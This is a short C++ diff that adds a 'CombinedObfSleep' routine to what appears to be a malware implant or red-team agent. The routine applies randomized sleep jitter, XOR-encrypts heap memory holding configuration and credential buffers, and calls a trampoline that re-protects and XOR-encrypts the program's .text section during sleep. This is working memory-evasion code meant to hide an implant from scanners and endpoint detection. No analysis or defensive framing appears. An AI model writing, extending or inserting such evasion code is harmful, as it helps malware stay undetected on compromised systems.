@@ -1,4 +1,5 @@
 #include "HeapEncrypt.h"
+#include "SleepObfusc.h"
 #include <cstdlib>
 #include <ctime>
 
@@ -44,4 +45,23 @@ void HeapEncrypt::EncryptedSleep(DWORD ms, DWORD jitter) {
     EncryptDecrypt();   // encrypt
     Sleep(ms);
     EncryptDecrypt();   // decrypt (XOR is its own inverse)
+}
+
+void HeapEncrypt::CombinedObfSleep(DWORD ms, DWORD jitter) {
+    if (jitter > 0) {
+        static bool seeded = false;
+        if (!seeded) { srand((unsigned)time(NULL)); seeded = true; }
+        ms += (DWORD)(rand() % (jitter + 1));
+    }
+
+    // Layer 1: encrypt all heap chunks (config strings, credential buffers, etc.)
+    EncryptDecrypt();
+
+    // Layer 2: encrypt .text section + sleep via SleepObfusc trampoline.
+    // SleepObfusc does its own VirtualProtect + XorSection + sleep + restore — no heap
+    // operations inside, so calling it with heap already encrypted is safe.
+    SleepObfusc::ObfuscatedSleep(ms, 0);
+
+    // Decrypt heap after .text is restored
+    EncryptDecrypt();
 }
